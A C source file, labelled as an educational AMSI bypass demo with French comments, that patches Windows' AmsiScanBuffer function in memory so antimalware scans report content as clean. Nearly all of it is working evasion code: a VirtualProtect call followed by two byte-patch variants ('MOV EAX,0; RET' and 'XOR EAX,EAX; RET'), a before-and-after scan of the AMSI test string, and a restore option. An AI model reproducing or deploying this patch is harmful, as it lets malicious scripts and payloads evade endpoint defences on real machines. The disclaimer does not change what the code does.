// EDUCATIONAL ONLY - AMSI Bypass Demo
// AVERTISSEMENT : Technique evasion AV - Ne jamais utiliser malicieusement

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#include <windows.h>

// AMSI definitions
typedef enum {
    AMSI_RESULT_CLEAN = 0,
    AMSI_RESULT_NOT_DETECTED = 1,
    AMSI_RESULT_BLOCKED_BY_ADMIN_START = 16384,
    AMSI_RESULT_BLOCKED_BY_ADMIN_END = 20479,
    AMSI_RESULT_DETECTED = 32768
} AMSI_RESULT;

typedef HRESULT (*AmsiInitialize_t)(LPCWSTR appName, HAMSICONTEXT* amsiContext);
typedef HRESULT (*AmsiScanBuffer_t)(HAMSICONTEXT amsiContext, PVOID buffer,
                                    ULONG length, LPCWSTR contentName,
                                    HAMSISESSION session, AMSI_RESULT* result);
typedef HRESULT (*AmsiUninitialize_t)(HAMSICONTEXT amsiContext);

// Backup pour restauration
typedef struct {
    void* address;
    unsigned char original_bytes[16];
    size_t size;
    DWORD old_protect;
} PatchBackup;

// Tester AMSI avec string suspecte
int test_amsi_scan(HAMSICONTEXT context, const char* test_string) {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) {
        printf("[!] Failed to load amsi.dll\n");
        return -1;
    }

    AmsiScanBuffer_t AmsiScanBuffer =
        (AmsiScanBuffer_t)GetProcAddress(amsi, "AmsiScanBuffer");
    if (!AmsiScanBuffer) {
        printf("[!] Failed to get AmsiScanBuffer\n");
        return -1;
    }

    AMSI_RESULT result;
    HRESULT hr = AmsiScanBuffer(context, (PVOID)test_string,
                                strlen(test_string), L"TestScan",
                                NULL, &result);

    if (FAILED(hr)) {
        printf("[!] AmsiScanBuffer failed (HRESULT: 0x%08lX)\n", hr);
        return -1;
    }

    printf("[*] AMSI Scan Result: ");
    switch (result) {
        case AMSI_RESULT_CLEAN:
            printf("CLEAN (0x%X)\n", result);
            break;
        case AMSI_RESULT_NOT_DETECTED:
            printf("NOT DETECTED (0x%X)\n", result);
            break;
        case AMSI_RESULT_DETECTED:
            printf("DETECTED - MALICIOUS (0x%X)\n", result);
            break;
        default:
            if (result >= AMSI_RESULT_BLOCKED_BY_ADMIN_START) {
                printf("BLOCKED BY ADMIN (0x%X)\n", result);
            } else {
                printf("UNKNOWN (0x%X)\n", result);
            }
    }

    return result >= AMSI_RESULT_DETECTED ? 1 : 0;
}

// Initialiser AMSI context
HAMSICONTEXT initialize_amsi(void) {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return NULL;

    AmsiInitialize_t AmsiInitialize =
        (AmsiInitialize_t)GetProcAddress(amsi, "AmsiInitialize");
    if (!AmsiInitialize) return NULL;

    HAMSICONTEXT context;
    HRESULT hr = AmsiInitialize(L"AMSIBypassDemo", &context);
    if (FAILED(hr)) {
        printf("[!] AmsiInitialize failed (HRESULT: 0x%08lX)\n", hr);
        return NULL;
    }

    printf("[+] AMSI context initialized\n");
    return context;
}

// Obtenir adresse fonction
void* get_function_address(const char* dll, const char* function) {
    HMODULE module = LoadLibraryA(dll);
    if (!module) return NULL;

    void* addr = GetProcAddress(module, function);
    if (!addr) return NULL;

    printf("[+] %s!%s = 0x%p\n", dll, function, addr);
    return addr;
}

// Patch AmsiScanBuffer avec MOV EAX, 0; RET
int patch_amsi_scan_buffer(PatchBackup* backup) {
    printf("\n[*] Patching AmsiScanBuffer...\n");

    void* addr = get_function_address("amsi.dll", "AmsiScanBuffer");
    if (!addr) return -1;

    backup->address = addr;
    backup->size = 6;

    // Sauvegarder bytes originaux
    memcpy(backup->original_bytes, addr, backup->size);
    printf("[+] Original bytes: ");
    for (size_t i = 0; i < backup->size; i++) {
        printf("%02X ", backup->original_bytes[i]);
    }
    printf("\n");

    // Modifier protection
    if (!VirtualProtect(addr, backup->size, PAGE_EXECUTE_READWRITE,
                        &backup->old_protect)) {
        printf("[!] VirtualProtect failed (error: %lu)\n", GetLastError());
        return -1;
    }

    // Patch: MOV EAX, 0; RET (retourne toujours AMSI_RESULT_CLEAN)
    unsigned char patch[] = {
        0xB8, 0x00, 0x00, 0x00, 0x00,  // MOV EAX, 0
        0xC3                            // RET
    };
    memcpy(addr, patch, sizeof(patch));

    // Restaurer protection
    DWORD temp;
    VirtualProtect(addr, backup->size, backup->old_protect, &temp);

    printf("[+] AmsiScanBuffer patched successfully\n");
    return 0;
}

// Patch alternatif: XOR EAX, EAX; RET (plus court)
int patch_amsi_xor_version(PatchBackup* backup) {
    printf("\n[*] Patching AmsiScanBuffer (XOR version)...\n");

    void* addr = get_function_address("amsi.dll", "AmsiScanBuffer");
    if (!addr) return -1;

    backup->address = addr;
    backup->size = 3;

    memcpy(backup->original_bytes, addr, backup->size);

    DWORD old_protect;
    if (!VirtualProtect(addr, backup->size, PAGE_EXECUTE_READWRITE, &old_protect)) {
        return -1;
    }

    // Patch: XOR EAX, EAX; RET
    unsigned char patch[] = {
        0x31, 0xC0,  // XOR EAX, EAX
        0xC3         // RET
    };
    memcpy(addr, patch, sizeof(patch));

    DWORD temp;
    VirtualProtect(addr, backup->size, old_protect, &temp);

    printf("[+] AmsiScanBuffer patched (XOR version)\n");
    return 0;
}

// Restaurer patch
int restore_patch(PatchBackup* backup) {
    printf("\n[*] Restoring original bytes...\n");

    if (!backup->address) {
        printf("[!] No backup to restore\n");
        return -1;
    }

    DWORD old_protect;
    if (!VirtualProtect(backup->address, backup->size,
                        PAGE_EXECUTE_READWRITE, &old_protect)) {
        return -1;
    }

    memcpy(backup->address, backup->original_bytes, backup->size);

    DWORD temp;
    VirtualProtect(backup->address, backup->size, old_protect, &temp);

    printf("[+] Original bytes restored\n");
    return 0;
}

int main(void) {
    printf("========================================\n");
    printf("  AMSI Bypass Demo (Educational)\n");
    printf("========================================\n");
    printf("AVERTISSEMENT : Educational purpose only\n");
    printf("         AV evasion technique\n\n");

    // Initialiser AMSI
    HAMSICONTEXT context = initialize_amsi();
    if (!context) {
        printf("[!] Failed to initialize AMSI\n");
        return 1;
    }

    // Test strings (EICAR-like pour AMSI)
    const char* clean_string = "This is a clean string";
    const char* malicious_string = "AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386";

    printf("\n[*] Testing AMSI with clean string...\n");
    test_amsi_scan(context, clean_string);

    printf("\n[*] Testing AMSI with malicious string...\n");
    int detected_before = test_amsi_scan(context, malicious_string);

    if (detected_before) {
        printf("\n[+] AMSI correctly detected malicious content\n");
    } else {
        printf("\n[~] Content not detected (maybe AMSI disabled?)\n");
    }

    // Patch AMSI
    PatchBackup backup = {0};
    printf("\n========================================\n");
    printf("Patching AMSI...\n");
    printf("========================================\n");

    if (patch_amsi_scan_buffer(&backup) != 0) {
        printf("[!] Failed to patch AMSI\n");
        return 1;
    }

    // Re-tester avec patch applique
    printf("\n[*] Re-testing with patched AMSI...\n");
    printf("[*] Testing malicious string again...\n");
    int detected_after = test_amsi_scan(context, malicious_string);

    if (!detected_after) {
        printf("\n[+] SUCCESS: AMSI bypass effective - malicious content not detected\n");
    } else {
        printf("\n[!] FAILED: AMSI still detecting content\n");
    }

    // Menu interactif
    printf("\n========================================\n");
    printf("Options:\n");
    printf("  1. Test clean string\n");
    printf("  2. Test malicious string\n");
    printf("  3. Restore AMSI\n");
    printf("  4. Re-patch AMSI (XOR version)\n");
    printf("  0. Exit\n");
    printf("========================================\n");

    int choice;
    while (1) {
        printf("\nChoice: ");
        if (scanf("%d", &choice) != 1) {
            while (getchar() != '\n');
            continue;
        }

        switch (choice) {
            case 1:
                test_amsi_scan(context, clean_string);
                break;
            case 2:
                test_amsi_scan(context, malicious_string);
                break;
            case 3:
                restore_patch(&backup);
                break;
            case 4:
                restore_patch(&backup);
                patch_amsi_xor_version(&backup);
                break;
            case 0:
                if (backup.address) {
                    printf("\n[*] Cleaning up...\n");
                    restore_patch(&backup);
                }
                printf("[*] Exiting\n");
                return 0;
            default:
                printf("[!] Invalid choice\n");
        }
    }

    return 0;
}

#else
// Non-Windows platform
int main(void) {
    printf("AMSI is Windows-specific\n");
    printf("Compile on Windows with: cl example.c\n");
    return 1;
}
#endif
